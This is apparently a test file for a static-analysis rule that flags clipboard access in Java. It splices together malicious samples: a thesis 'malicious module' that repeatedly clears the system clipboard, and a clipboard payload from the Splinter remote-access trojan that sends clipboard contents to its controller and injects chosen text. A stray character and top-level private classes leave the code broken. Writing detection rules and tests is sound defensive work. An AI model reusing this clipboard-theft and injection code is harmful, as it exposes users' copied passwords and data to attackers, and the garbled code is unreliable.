/*
 * Gdańsk University of Technology - Engineering Thesis
 * Malicious Module for Netbeans
 *
 * Cilińdź Michał, Gabryelska Nela, Micał Marek
 */
package pl.gda.pg.eti.kio.malicious.entity;

import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.FlavorEvent;
import java.awt.datatransfer.FlavorListener;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;
import pl.gda.pg.eti.kio.malicious.annotation.CreatableMalicious;
import pl.gda.pg.eti.kio.malicious.event.MaliciousEvent;

/**
 *
 * @author Marek Micał
 */
@CreatableMalicious(name = "clipboard")
public class Clipboard extends BaseMalice implements FlavorListener {

    boolean clipboardWork = true;
    
    java.awt.datatransfer.Clipboard clip = null;

    @Override
    public void flavorsChanged(FlavorEvent e) {
        try {
            Thread.sleep(100);
        } catch (Exception ex) {
        }
        setClipboard();
    }

    public void setClipboard() {

        Transferable trans = clip.getContents(null);

        if (trans.isDataFlavorSupported(DataFlavor.stringFlavor)) {
            try {
                // ruleid: maven-clipboard-access
                String s = (String) trans.getTransferData(DataFlavor.stringFlavor);
                StringSelection ss = new StringSelection(s);
                StringSelection newString = new StringSelection("");
                // ruleid: maven-clipboard-access
                clip.setContents(newString, ss);
            } catch (UnsupportedFlavorException | IOException e2) {
            }
        }
    }

    @Override
    protected void execute(MaliciousEvent event) {

        clip = Toolkit.getDefaultToolkit().getSystemClipboard();
        // ruleid: maven-clipboard-access
        clip.setContents(new StringSelection(""), null);
        if(!clipboardWork){
            // ruleid: maven-clipboard-access
            clip.addFlavorListener(this);
        }
    }
}



// another github example
/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/
private class ClipboardPayload
{
  static Clipboard extract_clipboard = null;
  static Clipboard inject_clipboard = null;

  static StringSelection strSelection = null;
  public static final String strMyClassName = "ClipboardPayload";

  public static boolean copyClipboard(Splinter_IMPLANT terminal)
  {
    try
    {
        
      extract_clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
      Transferable clipboard_Contents = extract_clipboard.getContents(null);

      if ((extract_clipboard != null) && (clipboard_Contents.isDataFlavorSupported(DataFlavor.stringFlavor)))
      {
        // ruleid: maven-clipboard-access
        terminal.sendToController(terminal.myUniqueDelimiter + "%%%%%" + "RESPONSE_CLIPBOARD" + "%%%%%" + clipboard_Contents.getTransferData(DataFlavor.stringFlavor), false, false);
      }
      else
      {
        terminal.sendToController(terminal.myUniqueDelimiter + "%%%%%" + "RESPONSE_CLIPBOARD" + "%%%%%" + " * --> NO TEXT IN CLIPBOARD AT THIS TIME <-- *", false, false);
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.sop("NOPE --> Could not gain exclusive access to Clipboard");
    }

    return false;
  }

  public static String getClipboardText()
  {
    try
    {
      extract_clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
      s
      Transferable clipboard_Contents = extract_clipboard.getContents(null);

      if ((extract_clipboard != null) && (clipboard_Contents.isDataFlavorSupported(DataFlavor.stringFlavor)))
      {
        // ruleid: maven-clipboard-access
        return ""+clipboard_Contents.getTransferData(DataFlavor.stringFlavor);
      }

      return " * --> NO TEXT IN CLIPBOARD AT THIS TIME <-- *";
    }
    catch (Exception e)
    {
      Driver.sop("[" + Driver.getTimeStamp_Without_Date() + "] -  Unable to extract Clipboard contents...");
    }

    return " *** --> NO TEXT IN CLIPBOARD AVAILABLE <-- ***";
  }

  public static boolean injectClipboard(Splinter_IMPLANT terminal, String injection)
  {
    try
    {
      if (injection == null) {
        injection = "";
      }
      strSelection = new StringSelection(injection);
      inject_clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
      // ruleid: maven-clipboard-access
      inject_clipboard.setContents(strSelection, null);

      terminal.sendToController(terminal.myUniqueDelimiter + "%%%%%" + "RESPONSE_CLIPBOARD" + "%%%%%" + "* * * Clipboard Injection Complete * * *", false, false);

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("injectClipboard", "ClipboardPayload", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public static boolean injectClipboard(String injection)
  {
    try
    {
      if (injection == null) {
        injection = "";
      }
      strSelection = new StringSelection(injection);
      inject_clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
      //ruleid: maven-clipboard-access
      inject_clipboard.setContents(strSelection, null);

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("injectClipboard", "ClipboardPayload", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  

}

private class other_example{
    // snippet to improve detection
    private static Toolkit toolkit=Toolkit.getDefaultToolkit();
    
    private boolean disableNumlock(int vk, boolean shift){
    boolean result = !numlockDisabled&&shift
        &&os.indexOf("WINDOWS")!=-1
        &&toolkit.getLockingKeyState(KeyEvent.VK_NUM_LOCK) // only works on Windows
        &&(
            // any numpad buttons are suspect
            vk==KeyEvent.VK_LEFT
            ||vk==KeyEvent.VK_UP
            ||vk==KeyEvent.VK_RIGHT
            ||vk==KeyEvent.VK_DOWN
            ||vk==KeyEvent.VK_HOME
            ||vk==KeyEvent.VK_END
            ||vk==KeyEvent.VK_PAGE_UP
            ||vk==KeyEvent.VK_PAGE_DOWN
    );
    log("disable numlock: "+result);
    return result;
    }
    private static java.awt.datatransfer.Clipboard getSystemClipboard() {
        return toolkit.getSystemClipboard();
    }

}

